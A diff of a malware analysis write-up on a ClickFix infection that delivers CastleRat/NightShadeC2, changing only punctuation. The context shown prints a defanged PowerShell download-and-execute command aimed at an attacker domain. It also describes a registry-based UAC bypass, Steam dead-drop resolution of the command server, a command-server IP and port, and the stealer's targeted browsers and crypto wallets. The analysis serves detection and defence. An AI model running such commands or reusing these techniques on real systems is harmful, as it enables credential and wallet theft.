@@ -22,9 +22,9 @@ C2 RESOLVE : Steam Community profile dead-drop
 C2         : 45.88.106.190:4545 (resolved)
 ```
 
-ClickFix-style delivery ending in CastleRat / NightShadeC2. User pasted an attacker-supplied command into Run (`Win+R`) believing it was CAPTCHA verification. The interesting part is the delivery path — remote task XML, junk-padded PowerShell, and Steam dead-drop C2 resolution — not the final implant.
+ClickFix-style delivery ending in CastleRat / NightShadeC2. User pasted an attacker-supplied command into Run (`Win+R`) believing it was CAPTCHA verification. The interesting part is the delivery path - remote task XML, junk-padded PowerShell, and Steam dead-drop C2 resolution - not the final implant.
 
-## Initial Access — ClickFix
+## Initial Access - ClickFix
 
 The lure page was not preserved, but the executed command was recovered from endpoint telemetry:
 
@@ -66,7 +66,7 @@ powershell -c "irm hxxps://yhofgafjle[.]com | iex"
 
 This is a standard download-and-execute pattern: `Invoke-RestMethod` fetches a script and pipes it directly to `Invoke-Expression` with no intermediate file on disk.
 
-## PowerShell Stager — AMSI Dilution
+## PowerShell Stager - AMSI Dilution
 
 The script from `yhofgafjle[.]com` contains hundreds of lines of filler:
 
@@ -146,7 +146,7 @@ Integrity: HIGH (elevated)
 
 The malware modifies `HKCU\Software\Classes\ms-settings\Shell\Open\command` and triggers auto-elevated `ComputerDefaults.exe`. Detection: `ComputerDefaults.exe` should not have a non-`explorer.exe` parent.
 
-## C2 Resolution — Steam Dead Drop
+## C2 Resolution - Steam Dead Drop
 
 The implant does not hardcode its C2 address. It retrieves:
 
@@ -176,12 +176,12 @@ YARA hits on process dumps tagged both **CastleRat** and **NightShadeC2**, likel
 
 Observed stealer functionality:
 
-- **Browsers** — Chrome, Edge, Firefox (cookies, credentials, autofill). Firefox decryption via victim-installed `nss3.dll`.
-- **Crypto wallets** — Exodus, Electrum, Atomic, Coinomi, Jaxx, Ledger Live, Ethereum keystore, WalletWasabi; extension wallets including MetaMask, Phantom, TronLink.
-- **Password managers** — 1Password, NordPass directory enumeration.
-- **VPN** — NordVPN, ProtonVPN configs.
-- **FTP** — Cyberduck, FileZilla.
-- **Screenshots** — observed across `pythonw.exe` memory regions.
+- **Browsers** - Chrome, Edge, Firefox (cookies, credentials, autofill). Firefox decryption via victim-installed `nss3.dll`.
+- **Crypto wallets** - Exodus, Electrum, Atomic, Coinomi, Jaxx, Ledger Live, Ethereum keystore, WalletWasabi; extension wallets including MetaMask, Phantom, TronLink.
+- **Password managers** - 1Password, NordPass directory enumeration.
+- **VPN** - NordVPN, ProtonVPN configs.
+- **FTP** - Cyberduck, FileZilla.
+- **Screenshots** - observed across `pythonw.exe` memory regions.
 
 Exfiltration over resolved C2 `45.88.106.190:4545`.
 
@@ -203,7 +203,7 @@ Exfiltration over resolved C2 `45.88.106.190:4545`.
                                          powershell -c "irm ... | iex"
                                                        │
                                                        ▼
-                                       [yhofgafjle.com — junk-padded script]
+                                       [yhofgafjle.com - junk-padded script]
                                                        │
                                                        ▼
                                        cWtdXfLUVptO()  →  maestrovsd.exe
